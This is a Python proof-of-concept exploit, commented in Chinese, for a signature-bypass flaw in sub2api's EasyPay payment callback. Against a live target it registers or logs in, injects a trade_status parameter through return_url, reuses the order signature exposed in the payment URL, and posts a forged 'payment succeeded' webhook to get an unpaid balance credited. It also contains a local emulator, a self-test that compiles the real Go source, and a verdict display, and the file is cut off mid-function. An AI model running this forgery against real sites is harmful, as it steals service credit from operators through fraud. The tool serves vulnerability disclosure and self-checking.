#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 sub2api 易支付(EasyPay)回调验签绕过 - 全自动 PoC
 GitHub issue: https://github.com/Wei-Shaw/sub2api/issues/7881
================================================================================

 漏洞原理(摘自 issue):
   缺陷A: easyPaySign 按 key 排序后直接 k=v&k=v 拼接, 值中的 & / = 不转义,
          一个参数的值里可以"藏"另一个参数。
   缺陷B: CanonicalizeReturnURL 只校验 scheme/host/path, query 原样保留;
          popup(submit.php)模式下单签名随支付 URL 直接暴露在付款人浏览器里。

 攻击链:
   1. 下单时提交 return_url = https://<site>/payment/result?trade_status=TRADE_SUCCESS
   2. 服务端追加 order_id/out_trade_no/resume_token/status 后按 key 排序重编码,
      注入的 trade_status 恰好排在 return_url 值内部最末尾, 参与下单签名;
   3. 从支付 URL 里拿到该签名, 伪造回调: return_url 只编码到 status=success 为止,
      让 &trade_status=TRADE_SUCCESS 以裸 & 形式升为顶层参数;
   4. 回调验签重排序拼接后与下单签名串逐字节一致 -> 验签通过 -> 伪造入账成功。

 ! 法律声明: 本工具仅供安全研究/自查。仅限用于你自己部署或获得书面授权的
   目标。对未授权目标使用造成的任何后果由使用者自行承担。

 用法:
   python sub2api_easypay_poc.py                # 交互式 TUI
   python sub2api_easypay_poc.py --selftest     # 离线自测(本地模拟漏洞/修复服务端)
   python sub2api_easypay_poc.py --target https://site --email a@b.c --password xxx --yes

 依赖: 纯标准库即可运行; 安装 rich 可获得更好的 TUI 体验 (pip install rich)
================================================================================
"""

import argparse
import hashlib
import json
import random
import re
import ssl
import string
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# Windows 控制台默认 GBK, 强制 UTF-8 输出避免中文乱码
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# ----------------------------------------------------------------------------
# 可选 rich TUI
# ----------------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.prompt import Prompt, Confirm
    from rich import box
    RICH = True
except ImportError:
    RICH = False

VERSION = "1.0.0"
ISSUE_URL = "https://github.com/Wei-Shaw/sub2api/issues/7881"
INJECT_MARKER = "trade_status=TRADE_SUCCESS"
PAID_STATUSES = {
    "paid", "completed", "recharging", "refund_requested", "refunding",
    "refund_pending", "partially_refunded", "refunded", "refund_failed",
}

# 判定结果
VULNERABLE = "VULNERABLE"
NOT_VULNERABLE = "NOT_VULNERABLE"
NOT_EXPLOITABLE = "NOT_EXPLOITABLE"
INCONCLUSIVE = "INCONCLUSIVE"


# ----------------------------------------------------------------------------
# HTTP 层 (stdlib)
# ----------------------------------------------------------------------------

def parse_qsl_go(qs, keep_blank_values=True):
    """按 Go net/url.ParseQuery 的语义解析 query。

    Go 1.17 起 ParseQuery 不再把 ';' 当分隔符, 而 Python 的 parse_qsl 默认会。
    """
    try:
        return urllib.parse.parse_qsl(qs, keep_blank_values=keep_blank_values,
                                      separator="&")
    except TypeError:
        return [kv for pair in qs.split("&") if pair
                for kv in urllib.parse.parse_qsl(pair,
                                                 keep_blank_values=keep_blank_values)]


def values_get(pairs, key):
    """Go url.Values.Get: 返回第一个匹配值, 没有则返回 ""。"""
    for k, v in pairs:
        if k == key:
            return v
    return ""


class ApiError(Exception):
    def __init__(self, message, status=None, reason=None):
        super().__init__(message)
        self.status = status
        self.reason = reason or ""


def http_request(method, url, headers=None, json_body=None, raw_body=None,
                 timeout=20, insecure=False):
    """发送 HTTP 请求, 返回 (status, headers, text)。不抛 HTTP 状态码异常。"""
    hdrs = {"User-Agent": f"sub2api-easypay-poc/{VERSION}"}
    if headers:
        hdrs.update(headers)
    data = None
    if json_body is not None:
        data = json.dumps(json_body).encode("utf-8")
        hdrs["Content-Type"] = "application/json"
    elif raw_body is not None:
        data = raw_body.encode("utf-8") if isinstance(raw_body, str) else raw_body
        hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")

    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(url, data=data, headers=hdrs, method=method.upper())
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", "replace")
        except Exception:
            body = ""
        _raise_if_gateway(e.code, body)
        return e.code, dict(e.headers or {}), body
    except urllib.error.URLError as e:
        raise ApiError(f"网络错误: {e.reason}") from e
    except TimeoutError as e:
        raise ApiError(f"请求超时: {url}") from e


GATEWAY_HINTS = {
    502: "上游应用挂了或 nginx 找不到后端容器",
    503: "上游服务不可用（后端容器未启动 / 过载 / 维护中）",
    504: "上游超时（后端卡住或负载过高）",
}


def _raise_if_gateway(status, body):
    """nginx/网关层返回 HTML 时给出可操作提示，而不是让调用方去解析 JSON。"""
    if status not in GATEWAY_HINTS or not (body or "").lstrip().startswith("<"):
        return
    raise ApiError(
        f"网关层返回 HTTP {status}（{GATEWAY_HINTS[status]}）",
        status=status, reason="gateway-html",
    )


class Sub2ApiClient:
    """sub2api 后端 API 封装 (响应包: {code:0, message, data})"""

    def __init__(self, base, timeout=20, insecure=False):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.insecure = insecure
        self.token = None

    def _headers(self, auth=True, referer=False):
        h = {}
        if auth and self.token:
            h["Authorization"] = f"Bearer {self.token}"
        if referer:
            h["Referer"] = self.base + "/purchase"
        return h

    def _call(self, method, path, auth=True, json_body=None, raw_body=None, referer=False):
        url = self.base + path
        status, _, text = http_request(
            method, url, headers=self._headers(auth, referer),
            json_body=json_body, raw_body=raw_body,
            timeout=self.timeout, insecure=self.insecure,
        )
        try:
            payload = json.loads(text) if text else {}
        except json.JSONDecodeError:
            raise ApiError(f"非 JSON 响应 (HTTP {status}): {text[:200]}", status)
        if isinstance(payload, dict) and payload.get("code") == 0:
            return payload.get("data")
        msg = reason = ""
        if isinstance(payload, dict):
            msg = payload.get("message") or ""
            reason = payload.get("reason") or ""
        raise ApiError(f"HTTP {status}: {msg or text[:200]}", status, reason)

    # --- auth ---
    def register(self, email, password, verify_code=""):
        body = {"email": email, "password": password}
        if verify_code:
            body["verify_code"] = verify_code
        return self._call("POST", "/api/v1/auth/register", auth=False, json_body=body)

    def send_verify_code(self, email):
        """发送邮箱验证码。返回响应 dict。

        注意: 目标若启用了人机验证, 该端点会返回 captcha 错误。
        """
        return self._call("POST", "/api/v1/auth/send-verify-code",
                          auth=False, json_body={"email": email})

    def login_2fa(self, temp_token, totp_code):
        return self._call("POST", "/api/v1/auth/login/2fa", auth=False,
                          json_body={"temp_token": temp_token, "totp_code": totp_code})

    def login(self, email, password):
        return self._call("POST", "/api/v1/auth/login", auth=False,
                          json_body={"email": email, "password": password})

    def me(self):
        return self._call("GET", "/api/v1/auth/me")

    # --- payment ---
    def checkout_info(self):
        return self._call("GET", "/api/v1/payment/checkout-info")

    def create_order(self, amount, payment_type, return_url):
        body = {
            "amount": amount,
            "payment_type": payment_type,
            "order_type": "balance",
            "return_url": return_url,
            "is_mobile": False,
        }
        return self._call("POST", "/api/v1/payment/orders", json_body=body, referer=True)

    def my_orders(self, page_size=50):
        return self._call("GET", f"/api/v1/payment/orders/my?page=1&page_size={page_size}")

    def cancel_order(self, order_id):
        return self._call("POST", f"/api/v1/payment/orders/{order_id}/cancel", json_body={})

    def webhook_easypay_raw(self, raw_body):
        url = self.base + "/api/v1/payment/webhook/easypay"
        return http_request("POST", url, headers=self._headers(auth=False),
                            raw_body=raw_body, timeout=self.timeout,
                            insecure=self.insecure)


# ----------------------------------------------------------------------------
# 漏洞核心: 签名算法 (与服务端 easyPaySign 等价) + 伪造回调构造
# ----------------------------------------------------------------------------
def easypay_sign(params, pkey):
    """MD5(sort(k=v&...)+pkey), 跳过 sign/sign_type/空值 -- 服务端逻辑复刻"""
    keys = sorted(k for k, v in params.items() if k not in ("sign", "sign_type") and v != "")
    base = "&".join(f"{k}={params[k]}" for k in keys)
    return hashlib.md5((base + pkey).encode("utf-8")).hexdigest()


class ForgeError(Exception):
    pass


def build_forged_callback(pay_url, marker=INJECT_MARKER):
    """
    从 popup 支付 URL 构造伪造回调 body。

    返回 (raw_body, info_dict)。info_dict 含截取前后的 return_url、签名等证据。
    若 pay_url 的 return_url 中不含注入 marker (说明 query 已被剥离/参数没进去),
    抛出 ForgeError。
    """
    split = urllib.parse.urlsplit(pay_url)
    pairs = parse_qsl_go(split.query)

    # Go 的 values.Get(k) 取第一个; 逐条覆盖会取最后一个, 参数重复时会对不上
    params = {}
    sign = values_get(pairs, "sign")
    sign_type = values_get(pairs, "sign_type") or "MD5"
    for k, v in pairs:
        if k in ("sign", "sign_type"):
            continue
        if k not in params:
            params[k] = v
    if not sign:
        raise ForgeError("支付 URL 中没有 sign 参数 (非 popup/submit.php 模式?)")

    full_return = params.get("return_url", "")
    idx = full_return.rfind("&" + marker)
    if idx < 0:
        # marker 是 return_url 的第一个 query 参数的情况 (?trade_status=...)
        qpos = full_return.find("?" + marker)
        if qpos >= 0 and full_return[qpos + 1:] == marker:
            idx = qpos
        else:
            raise ForgeError(
                "return_url 中不存在注入的 " + marker +
                " (目标可能已修复: CanonicalizeReturnURL 剥离了用户 query)"
            )
    prefix = full_return[:idx]
    injected_tail = full_return[idx + 1:]  # "trade_status=TRADE_SUCCESS"

    # 服务端验签时跳过空值参数, 构造时同样丢弃, 保证拼接串逐字节一致
    signed_params = {k: v for k, v in params.items() if v != ""}
    signed_params["return_url"] = prefix

    # 编码后的参数集合 + 裸 & 追加的 trade_status -> 升为顶层参数
    raw_body = urllib.parse.urlencode(signed_params)
    raw_body += "&" + injected_tail
    raw_body += "&sign=" + sign + "&sign_type=" + urllib.parse.quote(sign_type, safe="")

    info = {
        "sign": sign,
        "sign_type": sign_type,
        "return_url_full": full_return,
        "return_url_prefix": prefix,
        "signed_params": signed_params,
    }
    return raw_body, info


# ----------------------------------------------------------------------------
# UI 层: rich 优先, 纯文本兜底
# ----------------------------------------------------------------------------
class UI:
    def __init__(self, plain=False, verbose=False):
        self.verbose = verbose
        self.use_rich = RICH and not plain
        if self.use_rich:
            self.console = Console(highlight=False)

    # 基础输出 -----------------------------------------------------------
    def _c(self, text, color=None):
        if self.use_rich:
            # 用 Text 而不是 markup, 防止服务器响应中的 [ ] 被当作 rich 标记解析
            self.console.print(Text(text, style=color or ""))
        else:
            if color:
                codes = {"red": "31", "green": "32", "yellow": "33",
                         "cyan": "36", "magenta": "35", "gray": "90"}
                code = codes.get(color, "0")
                print(f"\033[{code}m{text}\033[0m")
            else:
                print(text)

    def banner(self):
        title = "sub2api 易支付回调验签绕过 PoC"
        sub = f"issue #7881 | v{VERSION} | 仅限授权目标"
        if self.use_rich:
            self.console.print(Panel(
                f"[bold red]{title}[/bold red]\n[cyan]{ISSUE_URL}[/cyan]\n[yellow]{sub}[/yellow]",
                border_style="red", box=box.DOUBLE))
        else:
            line = "=" * 64
            self._c(f"\n{line}\n  {title}\n  {ISSUE_URL}\n  {sub}\n{line}", "red")
        self._c("[!] 法律声明: 仅用于你自己部署或获得书面授权的目标,"
                "未授权测试属于违法行为。", "yellow")

    def step(self, idx, total, name):
        tag = f"[{idx}/{total}]"
        if self.use_rich:
            self.console.print(f"\n[bold cyan]{tag} {name}[/bold cyan]")
        else:
            self._c(f"\n{tag} {name}", "cyan")

    def ok(self, msg):
        self._c(f"  [+] {msg}", "green")

    def fail(self, msg):
        self._c(f"  [-] {msg}", "red")

    def info(self, msg):
        self._c(f"  [*] {msg}", "gray" if self.use_rich else None)

    def warn(self, msg):
        self._c(f"  [!] {msg}", "yellow")

    def debug(self, msg):
        if self.verbose:
            self._c(f"  [d] {msg}", "gray")

    def show_kv(self, rows, title=""):
        if self.use_rich:
            t = Table(title=title or None, box=box.SIMPLE, show_header=False)
            t.add_column("k", style="cyan", no_wrap=True)
            t.add_column("v", style="white", overflow="fold")
            for k, v in rows:
                t.add_row(str(k), str(v))
            self.console.print(t)
        else:
            if title:
                self._c(f"  --- {title} ---")
            for k, v in rows:
                self._c(f"    {k}: {v}")

    def verdict(self, result, evidence):
        color = {"VULNERABLE": "red", "NOT_VULNERABLE": "green",
                 "NOT_EXPLOITABLE": "yellow", "INCONCLUSIVE": "magenta"}[result["verdict"]]
        if self.use_rich:
            text = Text()
            text.append(result["verdict"], style=f"bold {color}")
            text.append("\n" + result["reason"])
            self.console.print()
            self.console.print(Panel(text, title="判定结果", border_style=color, box=box.HEAVY))
            if evidence:
                t = Table(title="证据", box=box.SIMPLE)
                t.add_column("项", style="cyan", no_wrap=True)
                t.add_column("值", style="white", overflow="fold")
                for k, v in evidence:
                    t.add_row(str(k), str(v))
                self.console.print(t)
        else:
            self._c("\n" + "=" * 64, color)
            self._c(f"  判定结果: {result['verdict']}", color)
            self._c(f"  原因: {result['reason']}", color)
            if evidence:
                self._c("  --- 证据 ---")
                for k, v in evidence:
                    self._c(f"    {k}: {v}")
            self._c("=" * 64, color)

    # 输入 ---------------------------------------------------------------
    def ask(self, prompt, default=None, password=False):
        if self.use_rich:
            return Prompt.ask(f"[bold]{prompt}[/bold]", default=default, password=password)
        suffix = f" [{default}]" if default not in (None, "") else ""
        if password:
            import getpass
            val = getpass.getpass(f"{prompt}{suffix}: ")
        else:
            val = input(f"{prompt}{suffix}: ")
        val = val.strip()
        return val or (default or "")

    def confirm(self, prompt, default=False):
        if self.use_rich:
            return Confirm.ask(f"[bold]{prompt}[/bold]", default=default)
        val = input(f"{prompt} [{'Y/n' if default else 'y/N'}]: ").strip().lower()
        if not val:
            return default
        return val in ("y", "yes")


# ----------------------------------------------------------------------------
# 攻击主流程
# ----------------------------------------------------------------------------
def normalize_base(url):
    url = url.strip()
    if not url:
        return ""
    if not re.match(r"^https?://", url, re.I):
        url = "https://" + url
    return url.rstrip("/")


def rand_str(n=10):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def ask_amount(ui, default=1.0, limits=None):
    """交互式询问漏洞利用金额, 直到输入合法正数; limits=(global_min, global_max)"""
    hint = ""
    if limits:
        lo, hi = limits
        lo = float(lo) if lo else 0.0
        hi = float(hi) if hi else 0.0
        if lo > 0 or hi > 0:
            hint = f" [平台限额 {'%.2f' % lo if lo > 0 else '0'} ~ {'%.2f' % hi if hi > 0 else '不限'}]"
    while True:
        raw = ui.ask(f"充值金额 (伪造入账的金额){hint}", default=f"{default:.2f}")
        try:
            v = float(raw)
        except (TypeError, ValueError):
            ui.warn("金额必须是数字, 如 0.01 / 10 / 650")
            continue
        if v <= 0:
            ui.warn("金额必须为正数")
            continue
        return v


def find_order(orders_data, order_id=None, out_trade_no=None):
    items = []
    if isinstance(orders_data, dict):
        items = orders_data.get("items") or []
    elif isinstance(orders_data, list):
        items = orders_data
    for o in items:
        if not isinstance(o, dict):
            continue
        if order_id is not None and o.get("id") == order_id:
            return o
        if out_trade_no and o.get("out_trade_no") == out_trade_no:
            return o
    return None


def run_exploit(client, ui, amount, methods):
    """
    执行完整攻击链。返回 (verdict_dict, evidence_rows)。
    verdict: VULNERABLE / NOT_VULNERABLE / NOT_EXPLOITABLE / INCONCLUSIVE
    """
    evidence = []
    created_order_ids = []

    # [1] 基线余额
    ui.step(1, 5, "获取当前账户基线 (GET /api/v1/auth/me)")
    me = client.me()
    balance_before = float(me.get("balance", 0.0))
    ui.ok(f"账户: {me.get('email', '?')}  余额: {balance_before:.2f}")
    evidence.append(("账户", me.get("email", "?")))
    evidence.append(("余额(前)", f"{balance_before:.2f}"))

    # [2] 探测可用的易支付 popup 下单通道
    ui.step(2, 5, "下单并注入 return_url (trade_status=TRADE_SUCCESS)")
    return_url = client.base + "/payment/result?" + INJECT_MARKER
    ui.info(f"恶意 return_url = {return_url}")

    order = None          # create_order 的 data
    used_method = None
    last_err = None
    for m in methods:
        try:
            data = client.create_order(amount, m, return_url)
        except ApiError as e:
            last_err = e
            ui.warn(f"payment_type={m} 下单失败: {e}")
            continue
        order = data or {}
        used_method = m
        oid = order.get("order_id")
        if oid:
            created_order_ids.append(oid)
        pay_url = order.get("pay_url") or ""
        mode = order.get("payment_mode") or ""
        ui.info(f"payment_type={m} 下单成功: order_id={oid} "
                f"out_trade_no={order.get('out_trade_no')} payment_mode={mode or '?'}")
        if "submit.php" in pay_url and "sign=" in pay_url:
            break
        else:
            ui.warn("该通道返回的 pay_url 不含 submit.php 签名参数, 尝试下一个通道")
            if oid:
                try:
                    client.cancel_order(oid)
                    ui.info(f"已取消探测订单 {oid}")
                except ApiError:
                    pass
            order = None
    if order is None:
        reason = "未找到可用的易支付 popup 下单通道"
        if last_err:
            reason += f" (最后错误: {last_err})"
        return ({"verdict": NOT_EXPLOITABLE,
                 "reason": reason + "。该站可能未启用易支付, 或未使用 popup(submit.php) 模式。"},
                evidence)

    pay_url = order.get("pay_url") or ""
    mode = order.get("payment_mode") or ""
    evidence.append(("order_id", order.get("order_id")))
    evidence.append(("out_trade_no", order.get("out_trade_no")))
    evidence.append(("pay_amount", order.get("pay_amount")))
    evidence.append(("payment_mode", mode or "?"))
    ui.debug(f"pay_url = {pay_url}")

    if mode and mode != "popup":
        return ({"verdict": NOT_EXPLOITABLE,
                 "reason": f"易支付实例为 {mode} 模式, 下单签名不暴露给付款人, "
                           "本攻击链不可用 (issue 中给出的临时缓解措施)。"},
                evidence)

    # [3] 构造伪造回调
    ui.step(3, 5, "解析支付 URL, 构造伪造回调")
    try:
        raw_body, info = build_forged_callback(pay_url)
    except ForgeError as e:
        # 没拿到 sign => 非 popup; return_url 无 marker => query 已被剥离(已修复)
        if "sign" in str(e):
            verdict, reason = NOT_EXPLOITABLE, str(e)
        else:
            verdict, reason = NOT_VULNERABLE, str(e)
        return ({"verdict": verdict, "reason": reason}, evidence)

    ui.ok("已从 pay_url 提取下单签名: " + info["sign"])
    ui.info("return_url 截断: ..." + info["return_url_prefix"][-60:])
    ui.info("注入参数已升为顶层: " + INJECT_MARKER)
    ui.debug("伪造回调 body = " + raw_body)
    evidence.append(("复用的 sign", info["sign"]))

    # [4] 发送伪造回调
    ui.step(4, 5, "发送伪造支付成功回调 (POST /api/v1/payment/webhook/easypay)")
    status, _, resp_text = client.webhook_easypay_raw(raw_body)
    ui.info(f"webhook 响应: HTTP {status} body={resp_text.strip()[:120]!r}")
    evidence.append(("webhook 响应", f"HTTP {status} {resp_text.strip()[:120]}"))

    if status == 400 or "verify failed" in resp_text.lower():
        # 验签被拒: 白名单修复 (return_url/notify_url 不在白名单) 或签名校验已改变
        try:
            client.cancel_order(order.get("order_id"))
        except ApiError:
            pass
        return ({"verdict": NOT_VULNERABLE,
                 "reason": "伪造回调被验签拒绝 (HTTP 400)。目标已修复 "
                           "(回调参数白名单生效), 或签名方案已变更。"},
                evidence)

    if status != 200:
        return ({"verdict": INCONCLUSIVE,
                 "reason": f"webhook 返回 HTTP {status}, 无法判定。"}, evidence)

    # [5] 轮询验证入账
    ui.step(5, 5, "轮询验证订单状态与余额 (最多 ~12s)")
    credited = False
    final_status = "?"
    for _ in range(8):
        time.sleep(1.5)
        try:
            o = find_order(client.my_orders(), order_id=order.get("order_id"),
                           out_trade_no=order.get("out_trade_no"))
        except ApiError:
            o = None
        if o:
            final_status = o.get("status", "?")
            if final_status in PAID_STATUSES:
                credited = True
                break
    try:
        balance_after = float(client.me().get("balance", 0.0))
    except ApiError:
        balance_after = balance_before
    delta = balance_after - balance_before
    evidence.append(("订单状态", final_status))
    evidence.append(("余额(后)", f"{balance_after:.2f}"))
    evidence.append(("余额变化", f"{delta:+.2f}"))

    if credited or delta >= amount * 0.999:
        return ({"verdict": VULNERABLE,
                 "reason": f"伪造回调被接受并入账: 订单 {order.get('out_trade_no')} "
                           f"状态={final_status}, 余额增加 {delta:.2f}。"
                           "目标存在签名复用漏洞, 请立即按 issue 中的方案修复。"},
                evidence)

    return ({"verdict": INCONCLUSIVE,
             "reason": "webhook 返回 200 但订单未入账/余额未变。"
                       "可能回调被 ack 但未通过后续处理, 或存在其它校验。"},
            evidence)


# ----------------------------------------------------------------------------
# 离线自测: 本地模拟 sub2api 服务端 (漏洞版 / 白名单修复版 / query剥离修复版)
# ----------------------------------------------------------------------------
SELFTEST_PKEY = "MERCHANT_SECRET_KEY_SELFTEST"
SELFTEST_PID = "1000"


class _EmuState:
    def __init__(self, patched_whitelist=False, patched_strip_query=False):
        self.patched_whitelist = patched_whitelist
        self.patched_strip_query = patched_strip_query
        self.balance = 0.0
        self.orders = {}
        self.next_id = 100


def _emu_json(handler, obj, status=200):
    body = json.dumps(obj).encode("utf-8")
    handler.send_response(status)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Content-Length", str(len(body)))
    handler.end_headers()
    handler.wfile.write(body)


def _emu_text(handler, text, status=200):
    body = text.encode("utf-8")
    handler.send_response(status)
    handler.send_header("Content-Type", "text/plain")
    handler.send_header("Content-Length", str(len(body)))
    handler.end_headers()
    handler.wfile.write(body)


def make_emu_handler(state):
    NOTIFY_WHITELIST = {"pid", "trade_no", "out_trade_no", "type", "name",
                        "money", "trade_status", "param", "sign", "sign_type"}

    class EmuHandler(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _body(self):
            n = int(self.headers.get("Content-Length", 0))
            return self.rfile.read(n).decode("utf-8", "replace") if n else ""

        def _host_base(self):
            return "http://" + (self.headers.get("Host") or "127.0.0.1")

        # --- 复刻服务端: return_url 规范化 + 追加参数 ---
        def _canonicalize(self, raw):
            """对应 CanonicalizeReturnURL: 校验 scheme/host/path"""
            p = urllib.parse.urlsplit(raw.strip())
            if p.scheme not in ("http", "https") or not p.netloc:
                raise ValueError("return_url must be absolute http/https")
            if p.path != "/payment/result":
                raise ValueError("return_url must target /payment/result")
            req_host = self.headers.get("Host", "")
            if p.netloc != req_host:
                raise ValueError("return_url must use same host")
            query = "" if state.patched_strip_query else p.query  # 修复①: 剥离 query
            return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path, query, ""))

        def _build_return(self, canonical, order_id, out_trade_no):
            """对应 buildPaymentReturnURL: 追加参数后按 key 排序重编码"""
            p = urllib.parse.urlsplit(canonical)
            q = dict(parse_qsl_go(p.query))
            q["order_id"] = str(order_id)
            q["out_trade_no"] = out_trade_no
            q["resume_token"] = "selftest_resume.token"
            q["status"] = "success"
            return urllib.parse.urlunsplit(
                (p.scheme, p.netloc, p.path, urllib.parse.urlencode(sorted(q.items())), ""))

        # --- 路由 ---
        def do_GET(self):
            path = urllib.parse.urlsplit(self.path).path
            if path == "/api/v1/auth/me":
                _emu_json(self, {"code": 0, "message": "success",
                                 "data": {"email": "poc@selftest.local",
                                          "balance": state.balance}})
            elif path == "/api/v1/payment/orders/my":
                items = [{"id": o["id"], "out_trade_no": o["out_trade_no"],
                          "status": o["status"], "amount": o["amount"]}
                         for o in state.orders.values()]
                _emu_json(self, {"code": 0, "message": "success",
                                 "data": {"items": items, "total": len(items),
                                          "page": 1, "page_size": 50, "pages": 1}})
            elif path == "/api/v1/payment/checkout-info":
                _emu_json(self, {"code": 0, "message": "success",
                                 "data": {"methods": {"alipay": {}}, "plans": []}})
            elif path == "/api/v1/payment/webhook/easypay":
                self._webhook(urllib.parse.urlsplit(self.path).query)
            else:
                _emu_json(self, {"code": 404, "message": "not found"}, 404)

        def do_POST(self):
            path = urllib.parse.urlsplit(self.path).path
            if path == "/api/v1/auth/login":
                _emu_json(self, {"code": 0, "message": "success",
                                 "data": {"access_token": "selftest-token",
                                          "token_type": "Bearer",
                                          "user": {"email": "poc@selftest.local"}}})
            elif path == "/api/v1/payment/orders":
                self._create_order()
            elif path == "/api/v1/payment/webhook/easypay":
                self._webhook(self._body())
            elif path.endswith("/cancel"):
                m = re.search(r"/orders/(\d+)/cancel", path)
                if m and int(m.group(1)) in state.orders:
                    state.orders[int(m.group(1))]["status"] = "cancelled"
                _emu_json(self, {"code": 0, "message": "success", "data": {}})
            else:
                _emu_json(self, {"code": 404, "message": "not found"}, 404)

        # --- 下单: 复刻 createRedirectPayment (popup) ---
        def _create_order(self):
            try:
                req = json.loads(self._body() or "{}")
                canon = self._canonicalize(req.get("return_url", ""))
            except (ValueError, json.JSONDecodeError) as e:
                _emu_json(self, {"code": 400, "message": str(e)}, 400)
                return
            amount = float(req.get("amount", 0))
            oid = state.next_id
            state.next_id += 1
            out_trade_no = "sub2_selftest" + rand_str(6)
            state.orders[oid] = {"id": oid, "out_trade_no": out_trade_no,
                                 "amount": amount, "pay_amount": amount,
                                 "status": "pending"}
            final_return = self._build_return(canon, oid, out_trade_no)
            money = f"{amount:.2f}"
            params = {
                "pid": SELFTEST_PID, "type": "alipay",
                "out_trade_no": out_trade_no,
                "notify_url": self._host_base() + "/api/v1/payment/webhook/easypay",
                "return_url": final_return,
                "name": f"Sub2API {money} CNY", "money": money,
            }
            params["sign"] = easypay_sign(params, SELFTEST_PKEY)
            params["sign_type"] = "MD5"
            pay_url = ("http://easypay.selftest/submit.php?" +
                       urllib.parse.urlencode(sorted(params.items())))
            _emu_json(self, {"code": 0, "message": "success", "data": {
                "order_id": oid, "amount": amount, "pay_amount": amount,
                "out_trade_no": out_trade_no, "status": "pending",
                "payment_type": "alipay", "payment_mode": "popup",
                "pay_url": pay_url,
            }})

        # --- 回调: 复刻 VerifyNotification ---
        def _webhook(self, raw_body):
            pairs = parse_qsl_go(raw_body)
            params = {}
            for k, v in pairs:
                if k not in params:      # Go 的 values.Get(k) 取第一个
                    params[k] = v
            if state.patched_whitelist:  # 修复②: 参数白名单
                for k in params:
                    if k not in NOTIFY_WHITELIST:
                        _emu_text(self, "verify failed", 400)
                        return
            sign = params.get("sign", "")
            if not sign or easypay_sign(params, SELFTEST_PKEY) != sign:
                _emu_text(self, "verify failed", 400)
                return
            o = next((x for x in state.orders.values()
                      if x["out_trade_no"] == params.get("out_trade_no")), None)
            if o is None:
                _emu_text(self, "success")  # 未知订单 ack
                return
            try:
                paid = float(params.get("money", "0"))
            except ValueError:
                paid = 0.0
            if (params.get("trade_status") == "TRADE_SUCCESS"
                    and abs(paid - o["pay_amount"]) <= 0.01):
                o["status"] = "completed"
                state.balance += o["amount"]
            _emu_text(self, "success")

    return EmuHandler


def _free_port():
    """让内核分配一个当前空闲的端口, 避免与残留进程抢 8900。"""
    import socket
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def run_selftest_real(ui):
    """用【真实 easypay.go 源码】做验签的端到端自检。

    为什么必须做这个: 场景 A/B/C 用的 _EmuState 是本脚本自己按源码复刻的
    服务端模型。它只能证明"本脚本的构造与我对源码的理解一致", 无法证明
    真实服务端真的这么跑 —— 这是循环论证。这里换成从 sub2api 仓库原样拷贝的
    easypay.go 编译出的服务, 验签逻辑是真实的。

    另外补两个反向对照, 证明服务端不是照单全收:
      - 垃圾签名必须被拒
      - 干净 return_url 的同样伪造必须被拒
    """
    import os
    import shutil
    import subprocess
    import tempfile

    here = os.path.dirname(os.path.abspath(__file__))
    # go-poc 在仓库根, 本脚本在 poc/ —— 先找同级的, 再回退到上一级
    gomod = os.path.join(here, "go-poc")
    if not os.path.isdir(gomod):
        gomod = os.path.join(os.path.dirname(here), "go-poc")
    if not os.path.isdir(gomod):
        ui.fail("找不到 go-poc/ 目录（真实源码自检需要它）")
        return 2
    if shutil.which("go") is None:
        ui.warn("这个环境没有 go，跳过真实源码自检。")
        ui.info("退而求其次可以跑 --selftest（复刻模型版）。")
        return 3

    env = dict(os.environ, GOTOOLCHAIN="local")
    ui._c("\n[编译真实 easypay.go ...]", "cyan")
    try:
        subprocess.run(["go", "build", "-o", os.path.join(tempfile.gettempdir(), "pocserver"),
                        "./cmd/pocserver"], cwd=gomod, env=env, check=True,
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        ui.fail("编译失败: " + (e.output or b"").decode("utf-8", "replace")[:400])
        return 1

    binary = os.path.join(tempfile.gettempdir(), "pocserver")
    # 随机挑一个空闲端口, 避免与残留进程冲突
    port = str(_free_port())
    srv = subprocess.Popen([binary, port], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    base = f"http://127.0.0.1:{port}"

    # 等服务真正起来；同时检测它是否启动即退出（比如端口被占）
    ready = False
    for _ in range(30):
        time.sleep(0.5)
        if srv.poll() is not None:
            out = (srv.stdout.read() or b"").decode("utf-8", "replace")
            ui.fail("pocserver 启动即退出: " + out.strip()[:300])
            return 1
        try:
            urllib.request.urlopen(base + "/api/v1/payment/checkout-info", timeout=2).read()
            ready = True
            break
        except urllib.error.HTTPError:
            ready = True
            break
        except Exception:
            continue
    if not ready:
        srv.terminate()
        ui.fail(f"pocserver (端口 {port}) 15 秒内没起来")
        return 1

    results = []

    try:
        client = Sub2ApiClient(base)
        data = client.login("tester@example.com", "correct-horse")
        client.token = (data or {}).get("access_token")

        ui._c("\n[正向: 完整攻击链]", "cyan")
        res, ev = run_exploit(client, ui, amount=650.00, methods=["alipay"])
        results.append(("攻击链被真实验签接受", res.get("verdict") == VULNERABLE))

        ui._c("\n[反向对照 1: 垃圾签名必须被拒]", "cyan")
        st, _, body = client.webhook_easypay_raw(
            "money=1.00&name=x&notify_url=n&out_trade_no=sub2_TESTORDER_0001"
            "&pid=1&return_url=x&trade_status=TRADE_SUCCESS"
            "&sign=deadbeefdeadbeefdeadbeefdeadbeef&sign_type=MD5")
        results.append((f"垃圾签名被拒 (HTTP {st})", st == 400))

        ui._c("\n[反向对照 2: 干净 return_url 的同样伪造必须被拒]", "cyan")
        clean_ok, clean_detail = _negative_clean_return_url(ui, client)
